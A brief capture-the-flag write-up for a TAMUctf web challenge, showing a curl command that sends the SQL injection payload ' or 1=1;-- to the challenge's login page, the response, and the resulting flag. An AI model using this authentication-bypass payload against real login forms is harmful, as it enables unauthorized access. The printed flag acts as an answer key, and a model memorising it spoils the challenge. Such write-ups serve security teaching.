# Not Another SQLi Challenge
Web

## Challenge 

http://web1.tamuctf.com

Difficulty: easy

## Solution

Simple SQL injection

	$ curl --data "username=' or 1=1;-- &password=" http://web1.tamuctf.com/web/login.php
	<html>gigem{f4rm3r5_f4rm3r5_w3'r3_4ll_r16h7}!</html>~ $ 


## Flag

	gigem{f4rm3r5_f4rm3r5_w3'r3_4ll_r16h7}